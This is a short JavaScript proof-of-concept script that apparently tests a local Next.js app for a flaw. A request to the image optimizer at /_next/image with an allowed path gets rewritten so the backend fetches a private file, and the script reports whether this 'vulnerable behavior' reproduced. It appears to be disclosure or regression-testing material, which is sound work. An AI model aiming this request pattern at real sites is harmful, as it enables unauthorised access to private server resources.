const baseUrl = new URL(process.argv[2] || 'http://localhost:3008')

async function getJson(path) {
  const response = await fetch(new URL(path, baseUrl))
  return response.json()
}

async function run() {
  await fetch(new URL('/api/reset', baseUrl), { method: 'POST' })

  const before = await getJson('/api/state')
  const optimizerUrl = new URL('/_next/image', baseUrl)
  optimizerUrl.searchParams.set(
    'url',
    `/allowed/secret.png?poc=${Date.now()}-${Math.random()}`
  )
  optimizerUrl.searchParams.set('w', '64')
  optimizerUrl.searchParams.set('q', '75')

  const response = await fetch(optimizerUrl)
  const body = await response.arrayBuffer()
  const after = await getJson('/api/state')

  console.log(`[before] ${JSON.stringify(before)}`)
  console.log(
    `[optimizer] status=${response.status} content-type=${
      response.headers.get('content-type') || ''
    } bytes=${body.byteLength}`
  )
  console.log(`[after] ${JSON.stringify(after)}`)

  if (
    response.ok &&
    after.backendRequests.some((request) =>
      request.startsWith('GET /private/secret.png')
    )
  ) {
    console.log('PoC result: vulnerable behavior reproduced.')
    return
  }

  console.log(
    'PoC result: private rewrite target was not fetched. This usually means the target is patched or rewrites are blocked for image optimizer.'
  )
}

run().catch((error) => {
  console.error(error)
  process.exit(1)
})
